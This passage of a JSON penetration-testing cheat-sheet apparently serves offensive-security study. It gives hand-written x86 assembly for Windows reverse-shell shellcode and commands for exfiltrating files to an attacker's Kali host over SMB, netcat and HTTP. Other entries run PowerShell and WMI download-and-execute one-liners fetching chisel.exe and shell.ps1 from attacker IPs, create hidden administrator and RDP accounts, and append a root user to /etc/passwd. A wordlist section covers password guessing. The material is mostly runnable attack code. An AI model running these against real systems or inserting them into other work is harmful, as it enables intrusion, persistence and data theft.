            "lang": "bash",
            "code": "rlwrap nc -lvnp <PORT>"
          }
        ],
        "notes": [
          {
            "type": "note",
            "content": "Catch a reverse shell from the target.",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "HackTricks WinRM",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm"
      },
      {
        "text": "HackTricks PSExec",
        "url": "https://book.hacktricks.xyz/windows-hardening/lateral-movement/psexec-and-winexec"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Methods to connect to a Windows target with credentials or a shell.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Reverse Shell Shellcode",
    "title": "Windows Reverse Shell Shellcode",
    "tags": [
      "Binary_Exploitation",
      "Custom_Tools",
      "Debugging",
      "Execution",
      "Exploitation",
      "Post_Exploitation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Reverse Shell Overview [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Steps required for a Windows reverse shell:\n1. Load **ws2_32.dll** (Winsock library)\n2. Call **WSAStartup** to initialize Winsock\n3. Create socket with **WSASocketA**\n4. Connect to attacker with **WSAConnect** or **connect**\n5. Create **cmd.exe** process with socket as stdin/stdout/stderr\n6. Optionally call **ExitProcess**",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Required Functions",
        "codes": [
          {
            "lang": "text",
            "code": "kernel32.dll:\n- LoadLibraryA (to load ws2_32.dll)\n- CreateProcessA (to spawn cmd.exe)\n\nws2_32.dll:\n- WSAStartup (initialize Winsock)\n- WSASocketA (create socket)\n- connect (connect to remote host)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Functions to resolve from DLLs."
          }
        ]
      },
      {
        "title": "Load ws2_32.dll",
        "codes": [
          {
            "lang": "nasm",
            "code": "; Assume EBP = kernel32 base, function resolver at find_function\n    push 0x00003233         ; \"32\\0\\0\"\n    push 0x5f327377         ; \"ws2_\"\n    push esp                ; Pointer to \"ws2_32\"\n    call [ebp + LoadLibraryA_offset]\n    mov esi, eax            ; ESI = ws2_32.dll base"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use **LoadLibraryA** to load Winsock library."
          }
        ]
      },
      {
        "title": "WSAStartup Call",
        "codes": [
          {
            "lang": "c",
            "code": "// C prototype\nint WSAStartup(WORD wVersionRequired, LPWSADATA lpWSAData);"
          },
          {
            "lang": "nasm",
            "code": "; WSAStartup(0x0202, &wsadata)\n    sub esp, 0x190          ; Allocate WSADATA structure (400 bytes)\n    push esp                ; lpWSAData\n    push 0x0202             ; wVersionRequired (2.2)\n    call [ebp + WSAStartup_offset]"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Initialize Winsock subsystem."
          }
        ]
      },
      {
        "title": "WSASocketA Call",
        "codes": [
          {
            "lang": "c",
            "code": "// C prototype\nSOCKET WSASocketA(int af, int type, int protocol,\n                  LPWSAPROTOCOL_INFOA lpProtocolInfo,\n                  GROUP g, DWORD dwFlags);"
          },
          {
            "lang": "nasm",
            "code": "; WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)\n    xor eax, eax\n    push eax                ; dwFlags = 0\n    push eax                ; g = 0\n    push eax                ; lpProtocolInfo = NULL\n    push eax                ; protocol = 0 (default)\n    inc eax\n    push eax                ; type = SOCK_STREAM (1)\n    inc eax\n    push eax                ; af = AF_INET (2)\n    call [ebp + WSASocketA_offset]\n    mov edi, eax            ; EDI = socket handle"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Create a TCP socket."
          }
        ]
      },
      {
        "title": "Connect to Attacker",
        "codes": [
          {
            "lang": "c",
            "code": "// C prototype\nint connect(SOCKET s, const sockaddr *name, int namelen);\n\n// sockaddr_in structure\nstruct sockaddr_in {\n    short   sin_family;     // AF_INET (2)\n    u_short sin_port;       // Port (network byte order)\n    struct  in_addr sin_addr; // IP address\n    char    sin_zero[8];    // Padding\n};"
          },
          {
            "lang": "nasm",
            "code": "; Build sockaddr_in on stack\n    push <AttackerIP>       ; sin_addr (e.g., 0x0100007f = 127.0.0.1)\n    push word <AttackerPort>; sin_port (e.g., 0x5c11 = 4444 big-endian)\n    push word 0x0002        ; sin_family = AF_INET\n\n; connect(socket, &sockaddr, 16)\n    mov esi, esp            ; ESI = pointer to sockaddr_in\n    push 16                 ; namelen\n    push esi                ; name\n    push edi                ; socket\n    call [ebp + connect_offset]"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Connect socket to attacker's listener."
          }
        ]
      },
      {
        "title": "CreateProcessA with Socket",
        "codes": [
          {
            "lang": "c",
            "code": "// STARTUPINFO structure (relevant fields)\ntypedef struct _STARTUPINFOA {\n    DWORD   cb;             // Size of structure\n    // ... other fields ...\n    DWORD   dwFlags;        // STARTF_USESTDHANDLES (0x100)\n    WORD    wShowWindow;\n    // ...\n    HANDLE  hStdInput;      // Socket handle\n    HANDLE  hStdOutput;     // Socket handle\n    HANDLE  hStdError;      // Socket handle\n} STARTUPINFOA;"
          },
          {
            "lang": "nasm",
            "code": "; Build STARTUPINFOA on stack\n    xor eax, eax\n    push edi                ; hStdError = socket\n    push edi                ; hStdOutput = socket\n    push edi                ; hStdInput = socket\n    push eax                ; lpReserved2 = NULL\n    push eax                ; cbReserved2 = 0\n    push eax                ; wShowWindow = 0\n    push 0x0100             ; dwFlags = STARTF_USESTDHANDLES\n    ; ... push remaining fields (mostly zeros) ...\n    push 68                 ; cb = sizeof(STARTUPINFOA)\n    mov esi, esp            ; ESI = &STARTUPINFOA\n\n; Build PROCESS_INFORMATION structure (16 bytes, receives output)\n    sub esp, 16\n    mov ecx, esp            ; ECX = &PROCESS_INFORMATION\n\n; Build \"cmd.exe\" string\n    push eax                ; NULL terminator\n    push 0x6578652e         ; \".exe\"\n    push 0x646d63           ; \"cmd\" (may need adjustment for NULLs)\n    mov ebx, esp            ; EBX = \"cmd.exe\"\n\n; CreateProcessA(NULL, \"cmd.exe\", ...)\n    push ecx                ; lpProcessInformation\n    push esi                ; lpStartupInfo\n    push eax                ; lpCurrentDirectory = NULL\n    push eax                ; lpEnvironment = NULL\n    push eax                ; dwCreationFlags = 0\n    push 1                  ; bInheritHandles = TRUE\n    push eax                ; lpThreadAttributes = NULL\n    push eax                ; lpProcessAttributes = NULL\n    push ebx                ; lpCommandLine = \"cmd.exe\"\n    push eax                ; lpApplicationName = NULL\n    call [ebp + CreateProcessA_offset]"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Spawn cmd.exe with socket handles for I/O redirection."
          }
        ]
      },
      {
        "title": "IP Address Encoding",
        "codes": [
          {
            "lang": "python",
            "code": "import socket\nimport struct\n\nip = \"<AttackerIP>\"\nport = <Port>\n\n# IP to DWORD (little-endian)\nip_bytes = socket.inet_aton(ip)\nip_dword = struct.unpack(\"<I\", ip_bytes)[0]\nprint(f\"IP DWORD: {hex(ip_dword)}\")\n\n# Port to big-endian WORD\nport_be = struct.pack(\">H\", port)\nprint(f\"Port bytes: {port_be.hex()}\")"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Convert IP address to DWORD format."
          }
        ]
      },
      {
        "title": "Avoiding Bad Characters in IP/Port",
        "codes": [
          {
            "lang": "nasm",
            "code": "; If IP contains NULL (e.g., 192.168.1.0)\n; Use XOR encoding:\nmov eax, 0xfefefefe         ; Mask\nxor eax, <EncodedIP>        ; Decode to get real IP\npush eax"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Handle bad characters in IP address or port:",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Winsock Reference",
        "url": "https://learn.microsoft.com/en-us/windows/win32/winsock/winsock-reference"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Build custom reverse shell shellcode using Windows Socket API."
      }
    ]
  },
  {
    "category": "Windows Shellcode Fundamentals",
    "title": "Windows Shellcode Fundamentals",
    "tags": [
      "Binary_Exploitation",
      "Custom_Tools",
      "Debugging",
      "Exploitation",
      "Windows"
    ],
    "steps": [
      {
        "title": "The System Call Problem [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Windows shellcode cannot use direct system calls like Linux:\n- **Linux**: Direct syscall via `int 0x80` or `syscall` instruction\n- **Windows**: System call numbers change between versions\n- **Solution**: Call Windows API functions exported from DLLs",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Shellcode Requirements [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "What shellcode needs to accomplish on Windows:\n1. Find **kernel32.dll** base address (always loaded)\n2. Locate **GetProcAddress** function in kernel32\n3. Use GetProcAddress to find other needed functions\n4. Call functions to achieve payload goal (e.g., reverse shell)",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Key Windows DLLs [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Important DLLs for shellcode:\n- **kernel32.dll**: Core functions (LoadLibrary, GetProcAddress, CreateProcess)\n- **ntdll.dll**: NT layer functions (lower-level APIs)\n- **ws2_32.dll**: Winsock functions (networking)\n- **user32.dll**: User interface functions",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Calling Conventions Review [Knowledge]",
        "codes": [
          {
            "lang": "nasm",
            "code": "; stdcall: callee cleans stack\npush arg3           ; Arguments pushed right-to-left\npush arg2\npush arg1\ncall function       ; Function cleans stack on return\n; No ADD ESP needed - callee did it"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Windows API uses `stdcall` convention."
          }
        ]
      },
      {
        "title": "Position Independence [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Shellcode must work at any memory location:\n- **No hardcoded addresses**: Use relative addressing\n- **Self-referencing**: Use CALL/POP to get current position\n- **Delta offset technique**: Calculate runtime addresses",
            "variant": "important"
          }
        ]
      },
      {
        "title": "NULL-Free Requirement [Knowledge]",
        "codes": [
          {
            "lang": "nasm",
            "code": "; NULL-producing:\nmov eax, 0          ; B8 00 00 00 00 (contains NULLs)\n\n; NULL-free alternatives:\nxor eax, eax        ; 31 C0 (no NULLs)\nsub eax, eax        ; 29 C0 (no NULLs)\npush 0; pop eax     ; 6A 00 58 (contains NULL - avoid)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Shellcode often cannot contain NULL bytes (0x00):\n- **Why**: String functions stop at NULL bytes\n- **Solution**: Use alternative instructions that don't produce NULLs",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Common NULL-Free Techniques",
        "codes": [
          {
            "lang": "nasm",
            "code": "; Moving small values:\nxor eax, eax        ; EAX = 0\nmov al, 0x10        ; EAX = 0x10 (no NULL)\n\n; Moving addresses with NULLs:\nmov eax, 0x00401000         ; Contains NULLs\n; Alternative:\nmov eax, 0x10401000         ; Modify high byte\nsub eax, 0x10000000         ; Subtract to get correct value\n\n; Pushing values with NULLs:\npush 0              ; 6A 00 (contains NULL)\n; Alternative:\nxor eax, eax\npush eax            ; No NULL in instruction"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Avoiding NULL bytes in instructions."
          }
        ]
      },
      {
        "title": "String Handling in Shellcode [Knowledge]",
        "codes": [
          {
            "lang": "nasm",
            "code": "; Technique: XOR encode the terminator\n; \"cmd\" = 0x00646D63\n; Push as 0xFF646D63, then XOR to fix\n\n; Or build string on stack:\nxor eax, eax\npush eax            ; NULL terminator\npush 0x646D63       ; \"cmd\" (no leading NULL)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Strings need NULL terminators but shellcode can't contain NULLs."
          }
        ]
      },
      {
        "title": "Thread Environment Block (TEB) [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "FS:[0x00] = SEH chain pointer\nFS:[0x18] = TEB self-pointer\nFS:[0x30] = PEB pointer (key for finding DLLs!)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "TEB contains per-thread data accessible via FS segment."
          }
        ]
      },
      {
        "title": "Process Environment Block (PEB) [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "PEB + 0x00 = InheritedAddressSpace\nPEB + 0x0C = Ldr (pointer to PEB_LDR_DATA)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "PEB contains process-wide data including loaded module list."
          }
        ]
      },
      {
        "title": "PEB_LDR_DATA Structure [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "Ldr + 0x0C = InLoadOrderModuleList\nLdr + 0x14 = InMemoryOrderModuleList\nLdr + 0x1C = InInitializationOrderModuleList"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Contains linked lists of loaded modules."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Windows Internals",
        "url": "https://learn.microsoft.com/en-us/sysinternals/"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Understanding Windows internals required for writing custom shellcode."
      }
    ]
  },
  {
    "category": "File Transfer Techniques",
    "title": "Windows to Kali (Exfiltration)",
    "tags": [],
    "steps": [
      {
        "title": "Using impacket-smbserver",
        "substeps": [
          {
            "title": "Setup SMB Server",
            "codes": [
              {
                "lang": "bash",
                "code": "# Basic SMB server\nimpacket-smbserver share . -smb2support\n\n# With authentication\nimpacket-smbserver share . -smb2support -username user -password pass"
              },
              {
                "lang": "bash",
                "code": "# Specify interface\nimpacket-smbserver share . -smb2support -ip <KaliIP>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          },
          {
            "title": "Transfer Files",
            "codes": [
              {
                "lang": "bash",
                "code": "# Copy file to Kali\ncopy file.txt \\\\<KaliIP>\\share\\\n\n# Copy multiple files\ncopy *.txt \\\\<KaliIP>\\share\\\n\n# Copy directory\nxcopy C:\\Users\\Admin\\Documents \\\\<KaliIP>\\share\\ /E /I"
              },
              {
                "lang": "powershell",
                "code": "# PowerShell copy\nCopy-Item file.txt -Destination \\\\<KaliIP>\\share\\"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**Most reliable method** for transferring files from Windows to Kali.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Using Netcat",
        "substeps": [
          {
            "title": "Receive File",
            "codes": [
              {
                "lang": "bash",
                "code": "nc -lvnp 4444 > received_file.txt"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          },
          {
            "title": "Send File",
            "codes": [
              {
                "lang": "bash",
                "code": "nc <KaliIP> 4444 < file.txt"
              },
              {
                "lang": "powershell",
                "code": "# PowerShell\nGet-Content file.txt | nc <KaliIP> 4444"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Using HTTP POST",
        "substeps": [
          {
            "title": "Setup Receiver",
            "codes": [
              {
                "lang": "python",
                "code": "# Simple HTTP server to receive files\npython3 -m uploadserver 80"
              },
              {
                "lang": "bash",
                "code": "# Or use this one-liner\nsudo python3 -c \"import http.server; import socketserver; class MyHandler(http.server.SimpleHTTPRequestHandler): def do_POST(self): length = int(self.headers['Content-Length']); data = self.rfile.read(length); open('uploaded_file', 'wb').write(data); self.send_response(200); self.end_headers(); socketserver.TCPServer(('', 80), MyHandler).serve_forever()\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          },
          {
            "title": "Upload File",
            "codes": [
              {
                "lang": "powershell",
                "code": "# PowerShell\n$file = Get-Content file.txt -Raw\nInvoke-RestMethod -Uri http://<KaliIP>/upload -Method Post -Body $file"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Using FTP",
        "substeps": [
          {
            "title": "Setup FTP Server",
            "codes": [
              {
                "lang": "bash",
                "code": "# Install pyftpdlib\nsudo pip3 install pyftpdlib\n\n# Start FTP server\nsudo python3 -m pyftpdlib -p 21 -w"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          },
          {
            "title": "Download from FTP",
            "codes": [
              {
                "lang": "bash",
                "code": "# Windows FTP client\nftp <KaliIP>\n# Username: anonymous\n# Password: (blank)\nget file.txt\nbye"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "User Management Commands",
    "title": "Windows User Management",
    "tags": [],
    "steps": [
      {
        "title": "Adding Users",
        "substeps": [
          {
            "title": "Basic User Creation",
            "codes": [
              {
                "lang": "bash",
                "code": "net user <Username> <Password> /add"
              },
              {
                "lang": "bash",
                "code": "# Example\nnet user hacker Password123! /add"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Add User to Administrators Group",
            "codes": [
              {
                "lang": "bash",
                "code": "net localgroup Administrators <Username> /add"
              },
              {
                "lang": "bash",
                "code": "# Example\nnet localgroup Administrators hacker /add"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Combined Command",
            "codes": [
              {
                "lang": "bash",
                "code": "net user hacker Password123! /add && net localgroup Administrators hacker /add"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Add User to Remote Desktop Users",
        "codes": [
          {
            "lang": "bash",
            "code": "net localgroup \"Remote Desktop Users\" <Username> /add"
          },
          {
            "lang": "bash",
            "code": "# Example\nnet localgroup \"Remote Desktop Users\" hacker /add"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Complete User Setup",
        "codes": [
          {
            "lang": "bash",
            "code": "# Create user, add to admins and RDP\nnet user hacker Password123! /add\nnet localgroup Administrators hacker /add\nnet localgroup \"Remote Desktop Users\" hacker /add"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "PowerShell User Creation",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Create user\nNew-LocalUser -Name \"hacker\" -Password (ConvertTo-SecureString \"Password123!\" -AsPlainText -Force)\n\n# Add to Administrators\nAdd-LocalGroupMember -Group \"Administrators\" -Member \"hacker\"\n\n# Add to Remote Desktop Users\nAdd-LocalGroupMember -Group \"Remote Desktop Users\" -Member \"hacker\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Viewing Users",
        "codes": [
          {
            "lang": "bash",
            "code": "# List all users\nnet user\n\n# View specific user details\nnet user <Username>\n\n# List administrators\nnet localgroup Administrators\n\n# List Remote Desktop Users\nnet localgroup \"Remote Desktop Users\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Modifying Users",
        "codes": [
          {
            "lang": "bash",
            "code": "# Change password\nnet user <Username> <NewPassword>\n\n# Disable user\nnet user <Username> /active:no\n\n# Enable user\nnet user <Username> /active:yes\n\n# Delete user\nnet user <Username> /delete"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Domain User Management",
        "codes": [
          {
            "lang": "bash",
            "code": "# Add domain user (requires domain admin)\nnet user <Username> <Password> /add /domain\n\n# Add to domain admins\nnet group \"Domain Admins\" <Username> /add /domain\n\n# View domain users\nnet user /domain\n\n# View domain admins\nnet group \"Domain Admins\" /domain"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Tunneling with Chisel",
    "title": "Windows-Specific Usage",
    "tags": [
      "Lateral_Movement",
      "Linux",
      "Pivoting",
      "Tunneling",
      "Windows"
    ],
    "steps": [
      {
        "title": "PowerShell Download and Execute",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Download chisel.exe\nIEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/chisel.exe', 'C:\\Temp\\chisel.exe')\n\n# Execute\nC:\\Temp\\chisel.exe client 10.10.14.5:8000 R:80:127.0.0.1:80"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Background Execution",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Run in background\nStart-Process -FilePath \"C:\\Temp\\chisel.exe\" -ArgumentList \"client 10.10.14.5:8000 R:80:127.0.0.1:80\" -WindowStyle Hidden"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "CMD Execution",
        "codes": [
          {
            "lang": "bash",
            "code": "chisel.exe client 10.10.14.5:8000 R:80:127.0.0.1:80"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "NetExec",
    "title": "WinRM Access",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [
      {
        "title": "Test WinRM Access",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc winrm <TargetIP> -u <Username> -p '<Password>'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Execute Command via WinRM",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc winrm <TargetIP> -u <Username> -p '<Password>' -x 'whoami'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Execute PowerShell via WinRM",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc winrm <TargetIP> -u <Username> -p '<Password>' -X 'Get-Process'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Fileless Lateral Movement",
    "title": "WMI Lateral Movement",
    "tags": [
      "Lateral_Movement",
      "Windows"
    ],
    "steps": [
      {
        "title": "WMI Process Creation",
        "codes": [
          {
            "lang": "bash",
            "code": "wmic /node:<Target> /user:<Domain>\\<User> /password:<Password> process call create \"cmd.exe /c <Command>\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "PowerShell WMI Execution",
        "codes": [
          {
            "lang": "powershell",
            "code": "$cred = New-Object System.Management.Automation.PSCredential(\"<Domain>\\<User>\", (ConvertTo-SecureString \"<Password>\" -AsPlainText -Force))\nInvoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"cmd.exe /c <Command>\" -ComputerName <Target> -Credential $cred"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "WMI Reverse Shell",
        "codes": [
          {
            "lang": "bash",
            "code": "wmic /node:<Target> /user:<User> /password:<Password> process call create \"powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/shell.ps1')\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Default Credentials",
    "title": "Wordlist Creation",
    "tags": [],
    "steps": [
      {
        "title": "Generate Custom Default List",
        "codes": [
          {
            "lang": "bash",
            "code": "# Combine multiple sources\ncat > custom_defaults.txt << EOF\npassword\npassword1\nPassword1\nPassword@123\npassword@123\nadmin\nadministrator\nadmin@123\nwelcome\nWelcome1\nWelcome@123\nP@ssw0rd\nP@ssword\nP@ssword1\nroot\ntoor\nchangeme\n12345678\n123456\nqwerty\nEOF"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Add Year Variations",
        "codes": [
          {
            "lang": "bash",
            "code": "# Add current year to passwords\nyear=$(date +%Y)\nwhile read pass; do\n    echo \"${pass}${year}\"\n    echo \"${pass}@${year}\"\ndone < custom_defaults.txt >> custom_defaults_year.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Password Attacks",
    "title": "Wordlist Generation",
    "tags": [
      "Credential_Access",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "CeWL - Generate from Website",
        "codes": [
          {
            "lang": "bash",
            "code": "cewl http://<Target> -d 3 -m 6 -w wordlist.txt\ncewl http://<Target> -d 3 -m 6 --email -w wordlist.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Crunch - Generate Pattern Wordlist",
        "codes": [
          {
            "lang": "bash",
            "code": "crunch 8 8 -t Pass@@%% -o wordlist.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "`@` lowercase, `,` uppercase, `%` number, `^` special"
          }
        ]
      },
      {
        "title": "Hashcat - Generate Wordlist from Mask",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat --stdout -a 3 --increment --increment-min 2 \"Summer?d?d?d?d\" > wordlist.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Mutate Wordlist with Rules",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt > mutated.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Password Strategy",
    "title": "Wordlist Recommendations",
    "tags": [],
    "steps": [
      {
        "title": "Quick Tests (< 1 minute)",
        "codes": [
          {
            "lang": "bash",
            "code": "# Top 100 passwords\n/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt\n\n# Top 1000 passwords\n/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Medium Tests (5-30 minutes)",
        "codes": [
          {
            "lang": "bash",
            "code": "# Top 10000 passwords\n/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt\n\n# Common passwords\n/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Full Tests (30+ minutes)",
        "codes": [
          {
            "lang": "bash",
            "code": "# Rockyou\n/usr/share/wordlists/rockyou.txt\n\n# SecLists passwords\n/usr/share/seclists/Passwords/"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Password Attacks",
    "title": "Wordlists",
    "tags": [
      "Credential_Access",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "Common Locations",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Built-in wordlists on Kali:\n- **/usr/share/wordlists/rockyou.txt** - 14 million passwords from breach\n- **/usr/share/wordlists/seclists/** - SecLists collection",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linux Privilege Escalation",
    "title": "Writable /etc/passwd",
    "tags": [
      "Linux",
      "Post_Exploitation",
      "Privilege_Escalation"
    ],
    "steps": [
      {
        "title": "Check if Writable",
        "codes": [
          {
            "lang": "bash",
            "code": "ls -la /etc/passwd"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Generate Password Hash",
        "codes": [
          {
            "lang": "bash",
            "code": "openssl passwd -1 -salt salt password123"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Add Root User",
        "codes": [
          {
            "lang": "bash",
            "code": "echo 'hacker:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu hacker"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "x86 Architecture",
    "title": "x86 Architecture Fundamentals",
    "tags": [
      "Binary_Exploitation",
      "Exploitation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Program Memory Layout",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
